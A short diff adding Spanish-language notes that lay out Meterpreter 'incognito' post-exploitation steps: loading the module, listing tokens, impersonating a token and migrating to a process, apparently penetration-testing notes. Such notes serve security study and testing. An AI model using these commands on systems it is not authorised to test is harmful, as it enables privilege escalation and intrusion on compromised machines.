@@ -1,0 +1,10 @@
+1)Una vez ya vulnerado el sistema y teniendo una shell reversa de meterpreter, cargar "incognito":
+load incognito
+
+2)Listar los tokens
+list_tokens -g
+
+3)impersonar un token
+impersonate_token "token"
+
+4)Migrar a un proceso con los mismos privilegios del token impersonado.
